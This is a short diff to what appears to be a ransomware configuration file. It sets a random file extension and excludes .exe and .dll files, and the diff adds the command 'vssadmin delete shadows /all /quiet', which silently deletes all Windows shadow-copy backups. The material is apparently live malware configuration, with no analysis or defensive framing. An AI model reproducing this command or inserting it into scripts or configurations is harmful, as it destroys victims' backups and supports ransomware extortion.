@@ -1,4 +1,6 @@
 file_extension: <random.10.10>
+command:
+  - vssadmin delete shadows /all /quiet
 exclude:
   - .exe
   - .dll
